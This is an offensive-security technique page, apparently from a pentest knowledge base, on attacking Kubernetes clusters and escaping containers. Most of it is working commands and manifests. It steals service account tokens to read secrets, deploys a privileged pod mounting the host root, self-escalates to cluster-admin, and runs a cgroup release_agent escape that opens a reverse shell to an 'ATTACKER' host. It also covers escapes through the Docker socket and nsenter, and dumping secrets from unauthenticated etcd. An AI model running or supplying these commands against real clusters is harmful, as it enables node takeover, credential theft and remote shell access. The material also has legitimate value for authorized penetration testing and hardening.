---
id: "kubernetes-attacks"
title: "Kubernetes RBAC Exploitation & Container Escape"
type: "technique"
category: "cloud"
subcategory: "kubernetes"
tags: ["kubernetes", "k8s", "rbac", "container-escape", "docker", "pod", "service-account", "deep-dig"]
platforms: ["linux"]
related: ["aws-iam-privesc", "metadata-ssrf", "cicd-attacks"]
difficulty: "expert"
updated: "2026-04-14"
---

# Kubernetes RBAC Exploitation & Container Escape

## Service Account Token Abuse
```bash
# Every pod gets a SA token:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Check permissions:
kubectl auth can-i --list

# Read secrets:
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets
```

## Privileged Pod → Node Escape
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: pwned
    image: alpine
    command: ["/bin/sh","-c","sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```
```bash
kubectl exec -it pwned -- chroot /host bash
# Root on node. Read etcd, kubelet certs, all secrets.
```

## RBAC Self-Escalation
```bash
# If you can create clusterrolebindings:
kubectl create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default
```

## Container Escape — CAP_SYS_ADMIN Cgroup
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## Container Escape — Docker Socket
```bash
# If /var/run/docker.sock is mounted:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash

# Or via curl:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

## Container Escape — nsenter
```bash
# From privileged container:
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Drops into host PID 1 namespace = full host access
```

## Etcd Direct Access
```bash
# If etcd exposed on port 2379 without auth:
ETCDCTL_API=3 etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix
# Secrets are base64 in etcd, not encrypted by default
```

## Dangerous RBAC Patterns
```
pods/exec create     → exec into any pod
secrets get/list     → read all secrets
clusterrolebindings create → self-escalate to cluster-admin
* * *                → god mode
```

## Tools
- kube-hunter (`kube-hunter --remote CLUSTER_IP`)
- Peirates (K8s pentest tool)
- CDK (`cdk evaluate --full` — container escape toolkit)
- deepce (Docker enumeration and escape)
- kubeaudit (audit cluster configs)
